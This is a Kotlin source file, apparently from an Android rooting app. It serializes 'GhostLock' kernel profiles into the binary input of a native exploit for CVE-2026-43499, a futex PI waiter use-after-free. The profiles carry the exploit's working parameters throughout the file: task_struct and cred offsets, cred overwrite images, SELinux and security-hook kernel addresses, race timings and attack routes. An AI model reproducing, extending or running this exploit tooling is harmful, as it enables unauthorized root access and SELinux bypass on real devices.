// SPDX-License-Identifier: GPL-3.0-or-later OR Apache-2.0
package com.hexo141.liquidglass.root

import java.io.ByteArrayOutputStream

/**
 * Turns one GhostLock HOCON profile into the binary transport `libghostlock.so` expects.
 *
 * The native side never parses HOCON: `core/profile/binary.cpp` defines a flat, self describing
 * document and Kotlin is expected to produce it. Keeping the translation here means the exploit
 * binary stays untouched when a new kernel profile is added - only the data file changes.
 *
 * Wire layout (little endian), mirroring `core/profile/binary.h` v2:
 * ```
 *   u32 magic       = 0x0D000721
 *   u16 version     = 2
 *   u16 frontend_id = 1   (root child)
 *   u16 backend_id  = 1   (CVE-2026-43499)
 *   u16 middleware_id = 0
 *   u16 release_length, release bytes
 *   u16 section_count
 *   per section: u8 name_length, name, u32 entry_count,
 *                per entry: u8 key_length, key, u64 value
 * ```
 * Absence is expressed by omitting the key: a profile that says `pi_lock = null` sends nothing for
 * that field, which the native parser reads as "not provided" and therefore distinct from a real 0.
 */
object GhostLockWire {

    /** `binary_profile::kMagic`. */
    private const val MAGIC = 0x0D000721L

    /** `binary_profile::kVersion`, the only format shipped. */
    private const val VERSION = 2

    /** `kFrontendRootChild`: the exploit keeps a root child alive instead of handing off to UMH. */
    private const val FRONTEND_ROOT_CHILD = 1

    /** `kBackendCve202643499`: the futex PI waiter UAF. */
    private const val BACKEND_CVE_2026_43499 = 1

    /** No middleware component is wired in this build. */
    private const val MIDDLEWARE_NONE = 0

    /**
     * One section of the document: a name plus the keys it accepts.
     *
     * The key order is copied from `kSections` in `binary.cpp` so a diff between the two is easy to
     * audit. Order does not matter to the parser (it looks keys up by name), but keeping it equal
     * makes a byte comparison against a reference build possible.
     */
    private class SectionSpec(val name: String, val keys: List<String>)

    /** Path of a key inside the parsed profile. `null` marks an optional profile field. */
    private class FieldSpec(val section: String, val key: String, val path: List<String>)

    /** `meta`. */
    private val META = SectionSpec(
        "meta",
        listOf("kernel_major", "recommend_shizuku", "fallback_route", "safe_mode"),
    )

    /** `task_struct`. */
    private val TASK = SectionSpec(
        "task_struct",
        listOf(
            "prio", "normal_prio", "sched_task_group", "pi_lock", "pi_waiters", "pi_top_task",
            "pi_blocked_on", "pid", "tgid", "atomic_flags", "real_cred", "cred", "comm", "tasks",
            "seccomp",
        ),
    )

    /** `cred`. */
    private val CRED = SectionSpec(
        "cred",
        listOf(
            "copy_size", "usage_offset", "usage_value", "caps_offset", "caps_count", "caps_value",
            "ref_count", "ref0_offset", "ref1_offset", "ref2_offset", "ref3_offset", "ref0_image",
            "ref1_image", "ref2_image", "ref3_image",
        ),
    )

    /** `offset` (kernel addresses, all plain values). */
    private val OFFSET = SectionSpec(
        "offset",
        listOf(
            "init_task", "init_cred", "empty_zero_page", "root_task_group", "selinux_enforcing",
            "selinux_blob_sizes", "security_hook_heads", "slide_nfulnl_logger", "slide_loggers_0_1",
            "slide_boot_id",
        ),
    )

    /** `kernel` (optional per-build extras). */
    private val KERNEL = SectionSpec(
        "kernel",
        listOf(
            "kernel_phys_load", "kernel_phys_offset", "compact_waiter",
            "kernelsnitch_collisions", "mm_struct_sz",
        ),
    )

    /** `execution.recommended_cpus`. */
    private val EXEC_CPUS = SectionSpec("execution.recommended_cpus", listOf("main", "consumer"))

    /** `execution.heap`. */
    private val EXEC_HEAP = SectionSpec(
        "execution.heap",
        listOf("prepare_max_attempts", "prepare_timeout_ms", "kernelsnitch_timeout_ms"),
    )

    /** `execution.race`. */
    private val EXEC_RACE = SectionSpec(
        "execution.race",
        listOf("route_wait_ms", "route_done_timeout_ms", "setup_settle_us", "state_poll_interval_us"),
    )

    /** `execution.stages`. */
    private val EXEC_STAGES = SectionSpec(
        "execution.stages",
        listOf(
            "w1_attempts", "w1_settle_us", "w1_scratch_repair_attempts", "w2_attempts",
            "w2_settle_us", "w3_chain_rounds", "w3_attempts", "w3_settle_us",
        ),
    )

    /** `execution.handoff`. */
    private val EXEC_HANDOFF = SectionSpec(
        "execution.handoff",
        listOf(
            "pre_dispatch_settle_ms", "module_poll_attempts", "module_poll_interval_ms",
            "enforce_poll_attempts", "enforce_poll_interval_ms",
        ),
    )

    /** `execution.consumer` (select_stack only). */
    private val EXEC_CONSUMER = SectionSpec(
        "execution.consumer",
        listOf("max_calls", "burst_calls"),
    )

    /** `route.tcp_zerocopy`. */
    private val ROUTE_TCP = SectionSpec(
        "route.tcp_zerocopy",
        listOf("attempts", "arm_sequence", "post_receive_hold_iterations"),
    )

    /** `route.select_stack`. */
    private val ROUTE_SELECT = SectionSpec(
        "route.select_stack",
        listOf("waiter_shift", "compact_waiter", "enter_delay_us", "timeout_us"),
    )

    /** `route.multicast_waiter`. */
    private val ROUTE_MULTICAST = SectionSpec(
        "route.multicast_waiter",
        listOf("waiter_off", "buffer_size", "task_offset", "lock_offset"),
    )

    /** Route ids as defined by `profile::RouteKind`. */
    private const val ROUTE_TCP_ZEROCOPY = 1
    private const val ROUTE_SELECT_STACK = 2
    private const val ROUTE_MULTICAST_WAITER = 3

    /**
     * Encodes [profile] (already `include`-expanded) for [release].
     *
     * Returns the bytes to pass to `--load-prebuilt-profile`, or null when the profile is missing a
     * field the parser needs to route the attack - a half-filled document would be worse than no
     * document, because the exploit would read kernel memory at a wrong offset.
     */
    fun encode(profile: String, release: String): ByteArray? {
        val parsed = HoconParser.parse(profile)
        val route = routeOf(parsed) ?: return null
        val sections = mutableListOf<Pair<SectionSpec, Map<String, Long>>>()

        for (spec in listOf(
            META, TASK, CRED, OFFSET, KERNEL,
            EXEC_CPUS, EXEC_HEAP, EXEC_RACE, EXEC_STAGES, EXEC_HANDOFF, EXEC_CONSUMER,
            ROUTE_TCP, ROUTE_SELECT, ROUTE_MULTICAST,
        )) {
            // Only the active route's section is written; `binary.cpp` ignores the others on read,
            // and emitting them would make the document larger without changing behaviour.
            if (spec.name.startsWith("route.") && spec.name != routeSectionName(route)) continue
            val values = valuesFor(spec, parsed)
            if (values.isNotEmpty()) sections += spec to values
        }

        val out = ByteArrayOutputStream(4_096)
        out.u32(MAGIC)
        out.u16(VERSION)
        out.u16(FRONTEND_ROOT_CHILD)
        out.u16(BACKEND_CVE_2026_43499)
        out.u16(MIDDLEWARE_NONE)
        val name = release.toByteArray(Charsets.US_ASCII)
        out.u16(name.size)
        out.write(name)
        out.u16(sections.size)
        for ((spec, values) in sections) {
            out.u8(spec.name.length)
            out.write(spec.name.toByteArray(Charsets.US_ASCII))
            out.u32(values.size.toLong())
            for ((key, value) in values) {
                out.u8(key.length)
                out.write(key.toByteArray(Charsets.US_ASCII))
                out.u64(value)
            }
        }
        return out.toByteArray()
    }

    /** Which of a section's keys the profile actually provides. */
    private fun valuesFor(spec: SectionSpec, parsed: Hocon): Map<String, Long> {
        val values = LinkedHashMap<String, Long>()
        for (key in spec.keys) {
            val value = lookup(spec.name, key, parsed) ?: continue
            values[key] = value
        }
        return values
    }

    /**
     * Reads one field out of the parsed document.
     *
     * The profile format spreads a section's keys over several blocks depending on the family:
     * `cred` and `kernelsnitch` arrive through `include`, `mm_struct_sz` sits under `kernelsnitch`
     * yet belongs to the native `kernel` section, and `compact_waiter` can appear under the route.
     * Those renames are what the native parser does with a flat document, so they are mirrored here.
     */
    private fun lookup(section: String, key: String, parsed: Hocon): Long? {
        return when (section) {
            // `meta`: `fallback` is a nested block, not a scalar.
            "meta" -> when (key) {
                "kernel_major" -> parsed.number("kernel_major")
                "recommend_shizuku" -> parsed.number("recommend_shizuku")
                "safe_mode" -> parsed.number("safe_mode")
                "fallback_route" -> {
                    val to = parsed.string(listOf("fallback"), "to") ?: return null
                    routeId(to)?.toLong()
                }
                else -> null
            }
            "kernel" -> when (key) {
                "kernelsnitch_collisions" -> parsed.number("kernelsnitch", "collisions")
                "mm_struct_sz" -> parsed.number("kernelsnitch", "mm_struct_sz")
                "compact_waiter" -> parsed.number("route", "tcp_zerocopy", "compact_waiter")
                    ?: parsed.number("fallback", "route", "select_stack", "compact_waiter")
                else -> parsed.number(key)
            }
            else -> parsed.number(section, key)
        }
    }

    /** `route { tcp_zerocopy { ... } }` -> [ROUTE_TCP_ZEROCOPY]. */
    private fun routeOf(parsed: Hocon): Int? = when {
        parsed.has("route", "tcp_zerocopy") -> ROUTE_TCP_ZEROCOPY
        parsed.has("route", "select_stack") -> ROUTE_SELECT_STACK
        parsed.has("route", "multicast_waiter") -> ROUTE_MULTICAST_WAITER
        // A profile may name only a fallback; the exploit still needs a primary route to arm.
        parsed.has("fallback", "route", "select_stack") -> ROUTE_SELECT_STACK
        parsed.has("fallback", "route", "tcp_zerocopy") -> ROUTE_TCP_ZEROCOPY
        else -> null
    }

    private fun routeSectionName(route: Int): String = when (route) {
        ROUTE_TCP_ZEROCOPY -> "route.tcp_zerocopy"
        ROUTE_SELECT_STACK -> "route.select_stack"
        ROUTE_MULTICAST_WAITER -> "route.multicast_waiter"
        else -> ""
    }

    private fun routeId(name: String): Int? = when (name.trim()) {
        "tcp_zerocopy" -> ROUTE_TCP_ZEROCOPY
        "select_stack" -> ROUTE_SELECT_STACK
        "multicast_waiter" -> ROUTE_MULTICAST_WAITER
        "auto", "none" -> 0
        else -> null
    }

    private fun ByteArrayOutputStream.u8(value: Int) = write(value and 0xFF)

    private fun ByteArrayOutputStream.u16(value: Int) = u16(value.toLong())

    private fun ByteArrayOutputStream.u16(value: Long) {
        write((value and 0xFF).toInt())
        write(((value shr 8) and 0xFF).toInt())
    }

    private fun ByteArrayOutputStream.u32(value: Long) {
        for (i in 0 until 4) write(((value shr (8 * i)) and 0xFF).toInt())
    }

    private fun ByteArrayOutputStream.u64(value: Long) {
        for (i in 0 until 8) write(((value shr (8 * i)) and 0xFF).toInt())
    }
}